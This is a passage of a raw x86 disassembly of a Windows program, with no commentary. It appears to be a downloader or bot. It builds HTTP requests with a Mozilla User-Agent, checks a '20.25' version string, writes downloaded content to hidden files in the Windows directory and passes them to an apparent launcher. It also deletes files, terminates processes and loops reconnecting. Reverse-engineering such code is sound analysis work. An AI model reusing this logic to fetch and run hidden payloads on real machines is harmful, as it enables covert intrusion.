jz      short loc_40288A
mov     bl, [eax+1]
mov     cl, bl
cmp     bl, [esi+1]
jnz     short loc_40288E
add     eax, 2
add     esi, 2
test    cl, cl
jnz     short loc_40286A

loc_40288A:
xor     eax, eax
jmp     short loc_402893

loc_40288E:
sbb     eax, eax
sbb     eax, 0FFFFFFFFh

loc_402893:
test    eax, eax
jz      short loc_4028A3
inc     ebp
cmp     ebp, edi
jl      short loc_402862

loc_40289C:
pop     edi
pop     esi
pop     ebp
xor     eax, eax
pop     ebx
retn

loc_4028A3:
mov     edi, offset Buffer
or      ecx, 0FFFFFFFFh
xor     eax, eax
repne scasb
not     ecx
dec     ecx
pop     edi
add     ecx, ebp
pop     esi
pop     ebp
pop     ebx
mov     ecx, [ecx+edx+1]
mov     edx, Data
cmp     ecx, edx
setz    al
retn
sub_402850 endp

align 10h



sub_4028D0 proc near

arg_0= dword ptr  4
arg_4= dword ptr  8

push    ebx
push    ebp
push    esi
push    edi
push    offset LibFileName ; "Kernel32.dll"
call    ds:LoadLibraryA
push    offset aGettickcount ; "GetTickCount"
push    eax             ; hModule
call    ds:GetProcAddress
mov     ebx, [esp+10h+arg_4]
xor     edi, edi
lea     esi, [ebx+ebx*4+3A98h]
shl     esi, 1
call    eax
test    ebx, ebx
mov     dword_40A098, eax
jle     short loc_402961
mov     ebp, [esp+10h+arg_0]

loc_402909:
mov     eax, dword_40A074
test    eax, eax
jnz     short loc_402975
mov     edx, dword_40A09C
mov     eax, ebx
sub     eax, edi
push    0
lea     ecx, [edi+ebp]
push    eax
push    ecx
push    edx
call    dword_40ACE4
cmp     eax, 0FFFFFFFFh
jnz     short loc_40294D
call    ds:WSOCK32_111
cmp     eax, 2733h
jnz     short loc_40296B
push    1               ; dwMilliseconds
call    ds:Sleep
mov     eax, esi
dec     esi
test    eax, eax
jz      short loc_40296B
jmp     short loc_40295D

loc_40294D:
add     edi, eax
mov     eax, ebx
sub     eax, edi
add     eax, 0BB8h
lea     esi, [eax+eax*4]
shl     esi, 1

loc_40295D:
cmp     edi, ebx
jl      short loc_402909

loc_402961:
pop     edi
pop     esi
pop     ebp
mov     eax, 1
pop     ebx
retn

loc_40296B:
mov     dword_40ACEC, 0

loc_402975:
pop     edi
pop     esi
pop     ebp
xor     eax, eax
pop     ebx
retn
sub_4028D0 endp

align 10h



sub_402980 proc near

var_201= byte ptr -201h
var_200= dword ptr -200h
arg_0= dword ptr  4
arg_4= dword ptr  8

sub     esp, 204h
mov     ecx, 80h
xor     eax, eax
push    esi
mov     esi, [esp+208h+arg_0]
push    edi
lea     edi, [esp+20Ch+var_200]
mov     edx, [esi+1]
inc     edx
push    edx             ; int
mov     [esi+1], edx
rep stosd
mov     eax, dword_40A128
push    1               ; int
push    offset Class    ; int
push    50h             ; Val
push    eax
call    ds:WSOCK32_11
lea     ecx, [esp+21Ch+var_200]
push    eax             ; int
push    ecx             ; int
call    sub_403410
lea     edi, [esp+224h+var_200]
or      ecx, 0FFFFFFFFh
xor     eax, eax
lea     edx, [esp+224h+var_200]
repne scasb
not     ecx
dec     ecx
push    ecx
push    edx
call    sub_4028D0
add     esp, 20h
test    eax, eax
jnz     short loc_4029ED
pop     edi
pop     esi
add     esp, 204h
retn

loc_4029ED:
lea     eax, [esp+20Ch+var_201]
push    1
push    eax
mov     [esp+214h+var_201], 0
call    sub_4028D0
mov     ecx, [esp+214h+arg_4]
push    ecx
push    esi
call    sub_4028D0
add     esp, 10h
pop     edi
pop     esi
add     esp, 204h
retn
sub_402980 endp

align 10h



sub_402A20 proc near

var_4= dword ptr -4

push    ecx
push    ebx
push    3E800h          ; Size
call    ds:malloc
mov     ebx, eax
add     esp, 4
test    ebx, ebx
jz      short loc_402A90
lea     eax, [esp+8+var_4]
push    0               ; int
push    eax             ; int
push    ebx             ; int
push    0               ; int
push    offset Class    ; int
push    offset unk_40A2AC ; int
push    50h             ; Val
push    offset unk_40A7AC ; int
call    sub_4021B0
add     esp, 20h
test    eax, eax
jz      short loc_402A86
push    esi
push    edi
mov     edi, offset unk_40A7AC
or      ecx, 0FFFFFFFFh
xor     eax, eax
repne scasb
not     ecx
sub     edi, ecx
mov     edx, ecx
mov     esi, edi
mov     edi, offset unk_40A82C
shr     ecx, 2
rep movsd
mov     ecx, edx
and     ecx, 3
rep movsb
pop     edi
pop     esi

loc_402A86:             ; Memory
push    ebx
call    ds:free
add     esp, 4

loc_402A90:
pop     ebx
pop     ecx
retn
sub_402A20 endp

align 10h



sub_402AA0 proc near

nNumberOfBytesToWrite= dword ptr -408h
NumberOfBytesWritten= dword ptr -404h
Buffer= byte ptr -400h

sub     esp, 408h
push    ebx
push    ebp
push    esi
push    edi
push    3E800h          ; Size
call    ds:malloc
mov     ebp, eax
add     esp, 4
test    ebp, ebp
jnz     short loc_402AC9
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 408h
retn

loc_402AC9:
lea     eax, [esp+418h+nNumberOfBytesToWrite]
push    0               ; int
push    eax             ; int
push    ebp             ; int
push    0               ; int
push    offset Class    ; int
push    offset unk_40A52C ; int
push    50h             ; Val
push    offset unk_40A82C ; int
call    sub_4021B0
add     esp, 20h
test    eax, eax
jnz     short loc_402B07
push    ebp             ; Memory
call    ds:free
add     esp, 4
xor     eax, eax
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 408h
retn

loc_402B07:
mov     ecx, [esp+418h+nNumberOfBytesToWrite]
mov     esi, offset a2025 ; "20.25"
mov     eax, ebp
mov     byte ptr [ecx+ebp], 0

loc_402B16:
mov     dl, [eax]
mov     bl, [esi]
mov     cl, dl
cmp     dl, bl
jnz     short loc_402B3E
test    cl, cl
jz      short loc_402B3A
mov     dl, [eax+1]
mov     bl, [esi+1]
mov     cl, dl
cmp     dl, bl
jnz     short loc_402B3E
add     eax, 2
add     esi, 2
test    cl, cl
jnz     short loc_402B16

loc_402B3A:
xor     eax, eax
jmp     short loc_402B43

loc_402B3E:
sbb     eax, eax
sbb     eax, 0FFFFFFFFh

loc_402B43:
test    eax, eax
jnz     short loc_402B5E
push    ebp             ; Memory
call    ds:free
add     esp, 4
xor     eax, eax
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 408h
retn

loc_402B5E:
lea     eax, [esp+418h+nNumberOfBytesToWrite]
push    0               ; int
push    eax             ; int
push    ebp             ; int
push    0               ; int
push    offset Class    ; int
push    offset unk_40A4AC ; int
push    50h             ; Val
push    offset unk_40A82C ; int
call    sub_4021B0
add     esp, 20h
test    eax, eax
jnz     short loc_402B9C
push    ebp             ; Memory
call    ds:free
add     esp, 4
xor     eax, eax
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 408h
retn

loc_402B9C:
lea     ecx, [esp+418h+Buffer]
push    400h            ; uSize
push    ecx             ; lpBuffer
call    ds:GetWindowsDirectoryA
mov     edi, offset unk_409480
or      ecx, 0FFFFFFFFh
xor     eax, eax
lea     edx, [esp+418h+Buffer]
repne scasb
not     ecx
sub     edi, ecx
push    eax             ; hTemplateFile
mov     esi, edi
mov     ebx, ecx
mov     edi, edx
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, ebx
dec     edi
shr     ecx, 2
rep movsd
push    2               ; dwFlagsAndAttributes
push    2               ; dwCreationDisposition
mov     ecx, ebx
push    eax             ; lpSecurityAttributes
push    eax             ; dwShareMode
and     ecx, 3
lea     eax, [esp+42Ch+Buffer]
push    40000000h       ; dwDesiredAccess
rep movsb
push    eax             ; lpFileName
call    ds:CreateFileA
mov     esi, eax
cmp     esi, 0FFFFFFFFh
jnz     short loc_402C0F
push    ebp             ; Memory
call    ds:free
add     esp, 4
xor     eax, eax
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 408h
retn

loc_402C0F:
mov     edx, [esp+418h+nNumberOfBytesToWrite]
lea     ecx, [esp+418h+NumberOfBytesWritten]
push    0               ; lpOverlapped
push    ecx             ; lpNumberOfBytesWritten
push    edx             ; nNumberOfBytesToWrite
push    ebp             ; lpBuffer
push    esi             ; hFile
call    ds:WriteFile
push    esi             ; hObject
mov     edi, eax
call    ds:CloseHandle
test    edi, edi
jnz     short loc_402C47
push    ebp             ; Memory
call    ds:free
add     esp, 4
xor     eax, eax
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 408h
retn

loc_402C47:
lea     eax, [esp+418h+Buffer]
push    eax             ; Str
call    sub_406B00
push    ebp             ; Memory
call    ds:free
add     esp, 8
mov     eax, 1
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 408h
retn
sub_402AA0 endp

align 10h



sub_402C70 proc near

nNumberOfBytesToWrite= dword ptr -408h
NumberOfBytesWritten= dword ptr -404h
Buffer= byte ptr -400h

sub     esp, 408h
push    ebx
push    ebp
push    esi
push    edi
push    3E800h          ; Size
call    ds:malloc
mov     ebx, eax
add     esp, 4
test    ebx, ebx
jnz     short loc_402C99
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 408h
retn

loc_402C99:
lea     eax, [esp+418h+nNumberOfBytesToWrite]
push    0               ; int
push    eax             ; int
push    ebx             ; int
push    0               ; int
push    offset Class    ; int
push    offset unk_40A22C ; int
push    50h             ; Val
push    offset unk_40A82C ; int
call    sub_4021B0
add     esp, 20h
test    eax, eax
jnz     short loc_402CD7
push    ebx             ; Memory
call    ds:free
add     esp, 4
xor     eax, eax
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 408h
retn

loc_402CD7:
mov     ecx, [esp+418h+nNumberOfBytesToWrite]
mov     esi, offset a2025 ; "20.25"
mov     eax, ebx
mov     byte ptr [ecx+ebx], 0

loc_402CE6:
mov     dl, [eax]
mov     cl, dl
cmp     dl, [esi]
jnz     short loc_402D0A
test    cl, cl
jz      short loc_402D06
mov     dl, [eax+1]
mov     cl, dl
cmp     dl, [esi+1]
jnz     short loc_402D0A
add     eax, 2
add     esi, 2
test    cl, cl
jnz     short loc_402CE6

loc_402D06:
xor     eax, eax
jmp     short loc_402D0F

loc_402D0A:
sbb     eax, eax
sbb     eax, 0FFFFFFFFh

loc_402D0F:
test    eax, eax
jnz     short loc_402D2A
push    ebx             ; Memory
call    ds:free
add     esp, 4
xor     eax, eax
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 408h
retn

loc_402D2A:
lea     eax, [esp+418h+nNumberOfBytesToWrite]
push    0               ; int
push    eax             ; int
push    ebx             ; int
push    0               ; int
push    offset Class    ; int
push    offset unk_40A1AC ; int
push    50h             ; Val
push    offset unk_40A82C ; int
call    sub_4021B0
add     esp, 20h
test    eax, eax
jnz     short loc_402D5C
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 408h
retn

loc_402D5C:
mov     ecx, [esp+418h+nNumberOfBytesToWrite]
lea     ebp, [ebx-2]
mov     byte ptr [ecx+ebx], 0
mov     edx, [esp+418h+nNumberOfBytesToWrite]
add     edx, ebx
cmp     ebp, edx
jnb     short loc_402DCC

loc_402D71:
test    ebp, ebp
jz      short loc_402DCC
lea     edi, [ebp+2]
push    0Dh             ; Val
push    edi             ; Str
call    ds:strchr
mov     ebp, eax
add     esp, 8
test    ebp, ebp
jz      short loc_402D8E
mov     byte ptr [ebp+0], 0

loc_402D8E:
mov     esi, offset Buffer
mov     ecx, edi

loc_402D95:
mov     al, [ecx]
mov     dl, al
cmp     al, [esi]
jnz     short loc_402DB9
test    dl, dl
jz      short loc_402DB5
mov     al, [ecx+1]
mov     dl, al
cmp     al, [esi+1]
jnz     short loc_402DB9
add     ecx, 2
add     esi, 2
test    dl, dl
jnz     short loc_402D95

loc_402DB5:
xor     ecx, ecx
jmp     short loc_402DBE

loc_402DB9:
sbb     ecx, ecx
sbb     ecx, 0FFFFFFFFh

loc_402DBE:
test    ecx, ecx
jz      short loc_402DE3
mov     ecx, [esp+418h+nNumberOfBytesToWrite]
add     ecx, ebx
cmp     ebp, ecx
jb      short loc_402D71

loc_402DCC:             ; Memory
push    ebx
call    ds:free
add     esp, 4
xor     eax, eax
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 408h
retn

loc_402DE3:
lea     edx, [esp+418h+nNumberOfBytesToWrite]
push    0               ; int
push    edx             ; int
push    ebx             ; int
push    0               ; int
push    offset Class    ; int
push    offset unk_40A12C ; int
push    50h             ; Val
push    offset unk_40A82C ; int
call    sub_4021B0
add     esp, 20h
test    eax, eax
jnz     short loc_402E21
push    ebx             ; Memory
call    ds:free
add     esp, 4
xor     eax, eax
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 408h
retn

loc_402E21:
lea     eax, [esp+418h+Buffer]
push    400h            ; uSize
push    eax             ; lpBuffer
call    ds:GetWindowsDirectoryA
mov     edi, offset unk_409480
or      ecx, 0FFFFFFFFh
xor     eax, eax
lea     edx, [esp+418h+Buffer]
repne scasb
not     ecx
sub     edi, ecx
push    eax             ; hTemplateFile
mov     esi, edi
mov     ebp, ecx
mov     edi, edx
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, ebp
dec     edi
shr     ecx, 2
rep movsd
push    2               ; dwFlagsAndAttributes
push    2               ; dwCreationDisposition
mov     ecx, ebp
push    eax             ; lpSecurityAttributes
push    eax             ; dwShareMode
and     ecx, 3
lea     eax, [esp+42Ch+Buffer]
push    40000000h       ; dwDesiredAccess
rep movsb
push    eax             ; lpFileName
call    ds:CreateFileA
mov     esi, eax
cmp     esi, 0FFFFFFFFh
jnz     short loc_402E94
push    ebx             ; Memory
call    ds:free
add     esp, 4
xor     eax, eax
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 408h
retn

loc_402E94:
mov     edx, [esp+418h+nNumberOfBytesToWrite]
lea     ecx, [esp+418h+NumberOfBytesWritten]
push    0               ; lpOverlapped
push    ecx             ; lpNumberOfBytesWritten
push    edx             ; nNumberOfBytesToWrite
push    ebx             ; lpBuffer
push    esi             ; hFile
call    ds:WriteFile
push    esi             ; hObject
mov     edi, eax
call    ds:CloseHandle
test    edi, edi
jnz     short loc_402ECC
push    ebx             ; Memory
call    ds:free
add     esp, 4
xor     eax, eax
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 408h
retn

loc_402ECC:
lea     eax, [esp+418h+Buffer]
push    eax             ; Str
call    sub_406B00
push    ebx             ; Memory
call    ds:free
add     esp, 8
mov     eax, 1
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 408h
retn
sub_402C70 endp




sub_402EF0 proc near

nNumberOfBytesToWrite= dword ptr -408h
NumberOfBytesWritten= dword ptr -404h
Buffer= byte ptr -400h

sub     esp, 408h
push    ebx
push    esi
push    edi
push    3E800h          ; Size
call    ds:malloc
mov     ebx, eax
add     esp, 4
test    ebx, ebx
jnz     short loc_402F17
pop     edi
pop     esi
pop     ebx
add     esp, 408h
retn

loc_402F17:
lea     eax, [esp+414h+nNumberOfBytesToWrite]
push    0               ; int
push    eax             ; int
push    ebx             ; int
push    0               ; int
push    offset Class    ; int
push    offset unk_40A42C ; int
push    50h             ; Val
push    offset unk_40A82C ; int
call    sub_4021B0
add     esp, 20h
test    eax, eax
jnz     short loc_402F54
push    ebx             ; Memory
call    ds:free
add     esp, 4
xor     eax, eax
pop     edi
pop     esi
pop     ebx
add     esp, 408h
retn

loc_402F54:
push    ebp
lea     ecx, [esp+418h+Buffer]
push    400h            ; uSize
push    ecx             ; lpBuffer
call    ds:GetWindowsDirectoryA
mov     edi, offset unk_40948C
or      ecx, 0FFFFFFFFh
xor     eax, eax
lea     edx, [esp+418h+Buffer]
repne scasb
not     ecx
sub     edi, ecx
push    eax             ; hTemplateFile
mov     esi, edi
mov     ebp, ecx
mov     edi, edx
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, ebp
dec     edi
shr     ecx, 2
rep movsd
push    2               ; dwFlagsAndAttributes
push    2               ; dwCreationDisposition
mov     ecx, ebp
push    eax             ; lpSecurityAttributes
push    eax             ; dwShareMode
and     ecx, 3
lea     eax, [esp+42Ch+Buffer]
push    40000000h       ; dwDesiredAccess
rep movsb
push    eax             ; lpFileName
call    ds:CreateFileA
mov     esi, eax
pop     ebp
cmp     esi, 0FFFFFFFFh
jnz     short loc_402FC8
push    ebx             ; Memory
call    ds:free
add     esp, 4
xor     eax, eax
pop     edi
pop     esi
pop     ebx
add     esp, 408h
retn

loc_402FC8:
mov     edx, [esp+414h+nNumberOfBytesToWrite]
lea     ecx, [esp+414h+NumberOfBytesWritten]
push    0               ; lpOverlapped
push    ecx             ; lpNumberOfBytesWritten
push    edx             ; nNumberOfBytesToWrite
push    ebx             ; lpBuffer
push    esi             ; hFile
call    ds:WriteFile
push    esi             ; hObject
mov     edi, eax
call    ds:CloseHandle
test    edi, edi
push    ebx             ; Memory
jnz     short loc_402FFF
call    ds:free
add     esp, 4
xor     eax, eax
pop     edi
pop     esi
pop     ebx
add     esp, 408h
retn

loc_402FFF:
call    ds:free
lea     eax, [esp+418h+Buffer]
push    eax             ; Str
call    sub_406B00
add     esp, 8
mov     eax, 1
pop     edi
pop     esi
pop     ebx
add     esp, 408h
retn
sub_402EF0 endp

align 10h



sub_403030 proc near

nNumberOfBytesToWrite= dword ptr -408h
NumberOfBytesWritten= dword ptr -404h
Buffer= byte ptr -400h

sub     esp, 408h
push    ebx
push    ebp
push    esi
push    edi
push    3E800h          ; Size
call    ds:malloc
mov     ebx, eax
add     esp, 4
test    ebx, ebx
jnz     short loc_403059
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 408h
retn

loc_403059:
lea     eax, [esp+418h+nNumberOfBytesToWrite]
push    0               ; int
push    eax             ; int
push    ebx             ; int
push    0               ; int
push    offset Class    ; int
push    offset unk_40A32C ; int
push    50h             ; Val
push    offset unk_40A82C ; int
call    sub_4021B0
add     esp, 20h
test    eax, eax
jnz     short loc_40308B
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 408h
retn

loc_40308B:
mov     ecx, [esp+418h+nNumberOfBytesToWrite]
lea     ebp, [ebx-2]
mov     byte ptr [ecx+ebx], 0
mov     edx, [esp+418h+nNumberOfBytesToWrite]
add     edx, ebx
cmp     ebp, edx
jnb     short loc_4030FB

loc_4030A0:
test    ebp, ebp
jz      short loc_4030FB
lea     edi, [ebp+2]
push    0Dh             ; Val
push    edi             ; Str
call    ds:strchr
mov     ebp, eax
add     esp, 8
test    ebp, ebp
jz      short loc_4030BD
mov     byte ptr [ebp+0], 0

loc_4030BD:
mov     esi, offset Buffer
mov     ecx, edi

loc_4030C4:
mov     al, [ecx]
mov     dl, al
cmp     al, [esi]
jnz     short loc_4030E8
test    dl, dl
jz      short loc_4030E4
mov     al, [ecx+1]
mov     dl, al
cmp     al, [esi+1]
jnz     short loc_4030E8
add     ecx, 2
add     esi, 2
test    dl, dl
jnz     short loc_4030C4

loc_4030E4:
xor     ecx, ecx
jmp     short loc_4030ED

loc_4030E8:
sbb     ecx, ecx
sbb     ecx, 0FFFFFFFFh

loc_4030ED:
test    ecx, ecx
jz      short loc_403112
mov     ecx, [esp+418h+nNumberOfBytesToWrite]
add     ecx, ebx
cmp     ebp, ecx
jb      short loc_4030A0

loc_4030FB:             ; Memory
push    ebx
call    ds:free
add     esp, 4
xor     eax, eax
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 408h
retn

loc_403112:
lea     edx, [esp+418h+nNumberOfBytesToWrite]
push    0               ; int
push    edx             ; int
push    ebx             ; int
push    0               ; int
push    offset Class    ; int
push    offset unk_40A3AC ; int
push    50h             ; Val
push    offset unk_40A82C ; int
call    sub_4021B0
add     esp, 20h
test    eax, eax
jnz     short loc_403150
push    ebx             ; Memory
call    ds:free
add     esp, 4
xor     eax, eax
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 408h
retn

loc_403150:
lea     eax, [esp+418h+Buffer]
push    400h            ; uSize
push    eax             ; lpBuffer
call    ds:GetWindowsDirectoryA
mov     edi, offset unk_409498
or      ecx, 0FFFFFFFFh
xor     eax, eax
lea     edx, [esp+418h+Buffer]
repne scasb
not     ecx
sub     edi, ecx
push    eax             ; hTemplateFile
mov     esi, edi
mov     ebp, ecx
mov     edi, edx
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, ebp
dec     edi
shr     ecx, 2
rep movsd
push    2               ; dwFlagsAndAttributes
push    2               ; dwCreationDisposition
mov     ecx, ebp
push    eax             ; lpSecurityAttributes
push    eax             ; dwShareMode
and     ecx, 3
lea     eax, [esp+42Ch+Buffer]
push    40000000h       ; dwDesiredAccess
rep movsb
push    eax             ; lpFileName
call    ds:CreateFileA
mov     esi, eax
cmp     esi, 0FFFFFFFFh
jnz     short loc_4031C3
push    ebx             ; Memory
call    ds:free
add     esp, 4
xor     eax, eax
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 408h
retn

loc_4031C3:
mov     edx, [esp+418h+nNumberOfBytesToWrite]
lea     ecx, [esp+418h+NumberOfBytesWritten]
push    0               ; lpOverlapped
push    ecx             ; lpNumberOfBytesWritten
push    edx             ; nNumberOfBytesToWrite
push    ebx             ; lpBuffer
push    esi             ; hFile
call    ds:WriteFile
push    esi             ; hObject
mov     edi, eax
call    ds:CloseHandle
test    edi, edi
push    ebx             ; Memory
jnz     short loc_4031FB
call    ds:free
add     esp, 4
xor     eax, eax
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 408h
retn

loc_4031FB:
call    ds:free
lea     eax, [esp+41Ch+Buffer]
push    eax             ; Str
call    sub_406B00
add     esp, 8
mov     eax, 1
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 408h
retn
sub_403030 endp

align 10h



sub_403220 proc near

var_404= dword ptr -404h
Buffer= byte ptr -400h

sub     esp, 404h
lea     eax, [esp+404h+Buffer]
push    ebx
mov     ebx, ds:GetWindowsDirectoryA
push    ebp
push    esi
push    edi
push    400h            ; uSize
push    eax             ; lpBuffer
call    ebx ; GetWindowsDirectoryA
mov     edi, offset unk_409480
or      ecx, 0FFFFFFFFh
xor     eax, eax
lea     edx, [esp+414h+Buffer]
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     ebp, ecx
mov     edi, edx
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, ebp
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, ebp
mov     ebp, ds:DeleteFileA
and     ecx, 3
lea     eax, [esp+414h+Buffer]
rep movsb
push    eax             ; lpFileName
call    ebp ; DeleteFileA
lea     ecx, [esp+414h+Buffer]
push    400h            ; uSize
push    ecx             ; lpBuffer
call    ebx ; GetWindowsDirectoryA
mov     edi, offset unk_40948C
or      ecx, 0FFFFFFFFh
xor     eax, eax
lea     edx, [esp+414h+Buffer]
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     edi, edx
mov     edx, ecx
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, edx
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, edx
lea     eax, [esp+414h+Buffer]
and     ecx, 3
push    eax             ; lpFileName
rep movsb
call    ebp ; DeleteFileA
lea     ecx, [esp+414h+Buffer]
push    400h            ; uSize
push    ecx             ; lpBuffer
call    ebx ; GetWindowsDirectoryA
mov     edi, offset unk_409498
or      ecx, 0FFFFFFFFh
xor     eax, eax
lea     edx, [esp+414h+Buffer]
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     ebx, ecx
mov     edi, edx
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, ebx
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, ebx
and     ecx, 3
lea     eax, [esp+414h+Buffer]
rep movsb
push    eax             ; lpFileName
call    ebp ; DeleteFileA
mov     edi, ds:Sleep
xor     ebx, ebx
mov     ebp, 1

loc_403306:
mov     ecx, ProcessInformation
push    ebx             ; uExitCode
push    ecx             ; hProcess
call    ds:TerminateProcess
mov     eax, dword_40A09C
mov     dword_40ACF4, ebx
cmp     eax, ebx
mov     dword_40A07C, ebx
mov     dword_40A074, ebx
jz      short loc_403336
push    eax
call    ds:WSOCK32_3

loc_403336:             ; dwMilliseconds
push    32h
mov     dword_40A09C, ebx
mov     dword_40ACEC, ebx
call    edi ; Sleep
call    sub_402AA0
test    eax, eax
jnz     loc_4033FF
call    sub_402C70
test    eax, eax
jnz     loc_4033FF
mov     esi, 1D4C0h
call    sub_4023E0
test    eax, eax
jz      short loc_403375
call    sub_4024A0
jmp     short loc_40337A

loc_403375:
mov     esi, 2710h

loc_40337A:
call    sub_402440
test    eax, eax
jnz     short loc_40338B
push    esi             ; dwMilliseconds
call    edi ; Sleep
jmp     loc_403306

loc_40338B:
call    sub_4027F0
test    eax, eax
jnz     short loc_4033A0
push    2710h           ; dwMilliseconds
call    edi ; Sleep
jmp     loc_403306

loc_4033A0:
call    sub_4038D0
test    eax, eax
jnz     short loc_4033B5
push    2710h           ; dwMilliseconds
call    edi ; Sleep
jmp     loc_403306

loc_4033B5:
mov     eax, dword_40A09C
lea     edx, [esp+414h+var_404]
push    edx
push    8004667Eh
push    eax
mov     [esp+420h+var_404], ebp
call    ds:WSOCK32_12
mov     dword_40ACEC, ebp
mov     byte_40A08C, bl
mov     dword_40A06C, ebp

loc_4033E1:
cmp     dword_40A07C, ebx
jz      short loc_4033EE
call    sub_403A40

loc_4033EE:
cmp     dword_40ACEC, ebx
jz      loc_403306
push    ebp             ; dwMilliseconds
call    edi ; Sleep
jmp     short loc_4033E1

loc_4033FF:
pop     edi
pop     esi
pop     ebp
pop     ebx
add     esp, 404h
retn
sub_403220 endp

align 10h



; int __cdecl sub_403410(int, int, int Val, int, int, int)
sub_403410 proc near

var_10= byte ptr -10h
DstBuf= byte ptr -0Fh
arg_0= dword ptr  4
arg_4= dword ptr  8
Val= dword ptr  0Ch
arg_C= dword ptr  10h
arg_10= dword ptr  14h
arg_14= dword ptr  18h

sub     esp, 10h
mov     ecx, [esp+10h+Val]
push    ebx
push    esi
push    edi
lea     eax, [esp+1Ch+DstBuf]
push    0Ah             ; Radix
push    eax             ; DstBuf
push    ecx             ; Val
mov     [esp+28h+var_10], 3Ah
call    ds:_itoa
mov     edx, [esp+28h+arg_10]
add     esp, 0Ch
test    edx, edx
mov     edi, offset aGet ; "GET "
jz      short loc_403442
mov     edi, offset aPost ; "POST "

loc_403442:
or      ecx, 0FFFFFFFFh
xor     eax, eax
repne scasb
mov     ebx, [esp+1Ch+arg_0]
push    ebp
not     ecx
sub     edi, ecx
mov     eax, ecx
mov     esi, edi
mov     edi, ebx
shr     ecx, 2
rep movsd
mov     ecx, eax
and     ecx, 3
rep movsb
mov     eax, dword_40AA1C
test    eax, eax
jz      short loc_4034E5
or      ecx, 0FFFFFFFFh
mov     edi, offset aHttp_0 ; "http://"
xor     eax, eax
repne scasb
not     ecx
sub     edi, ecx
mov     ebp, ecx
mov     esi, edi
or      ecx, 0FFFFFFFFh
mov     edi, ebx
repne scasb
mov     ecx, ebp
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, ebp
and     ecx, 3
rep movsb
mov     edi, [esp+20h+arg_4]
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     ebp, ecx
mov     edi, ebx
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, ebp
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, ebp
and     ecx, 3
rep movsb
lea     edi, [esp+20h+var_10]
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     ebp, ecx
mov     edi, ebx
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, ebp
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, ebp
and     ecx, 3
rep movsb

loc_4034E5:
mov     edi, [esp+20h+arg_C]
or      ecx, 0FFFFFFFFh
xor     eax, eax
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     ebp, ecx
mov     edi, ebx
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, ebp
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, ebp
and     ecx, 3
cmp     edx, 1
rep movsb
jnz     short loc_40353B
mov     edi, offset aIndexHtm ; "/index.htm"
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     ebp, ecx
mov     edi, ebx
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, ebp
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, ebp
and     ecx, 3
rep movsb

loc_40353B:
or      ecx, 0FFFFFFFFh
mov     edi, offset aHttp10 ; " HTTP/1.0\r\n"
xor     eax, eax
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     ebp, ecx
or      ecx, 0FFFFFFFFh
mov     edi, ebx
repne scasb
mov     ecx, ebp
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, ebp
and     ecx, 3
rep movsb
or      ecx, 0FFFFFFFFh
mov     edi, offset aUserAgentMozil ; "User-Agent: Mozilla/4.0 (compatible; MS"...
repne scasb
not     ecx
sub     edi, ecx
mov     ebp, ecx
mov     esi, edi
or      ecx, 0FFFFFFFFh
mov     edi, ebx
repne scasb
mov     ecx, ebp
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, ebp
and     ecx, 3
rep movsb
mov     edi, [esp+20h+arg_4]
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     ebp, ecx
mov     edi, ebx
or      ecx, 0FFFFFFFFh
repne scasb
mov     ecx, ebp
dec     edi
shr     ecx, 2
rep movsd
mov     ecx, ebp
and     ecx, 3
rep movsb
lea     edi, [esp+20h+var_10]
or      ecx, 0FFFFFFFFh
repne scasb
not     ecx
sub     edi, ecx
mov     esi, edi
mov     ebp, ecx
mov     edi, ebx
or      ecx, 0FFFFFFFFh
